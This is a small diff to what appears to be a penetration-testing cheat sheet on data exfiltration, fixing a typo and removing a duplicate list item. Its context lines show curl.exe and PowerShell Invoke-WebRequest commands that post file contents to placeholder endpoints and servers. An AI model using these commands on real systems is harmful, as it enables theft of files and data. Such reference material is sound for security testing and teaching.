@@ -257,11 +257,7 @@ curl.exe -F "file1=@filename.txt" <end_point>
 $content = Get-Content %FILE_TO_EXFIL% # output.txt
 Invoke-WebRequest -Uri http://<http_server> -Method POST -Body $content
 ```
-Exfiltrat files and send the contents via a HTTP post request.
-
-  <ul>
-    <li>HTTP POST request:</li>
-  </ul>
+Exfiltrate files and send the contents via a HTTP post request.
 
   <ul>
     <li>FTP File Upload:</li>
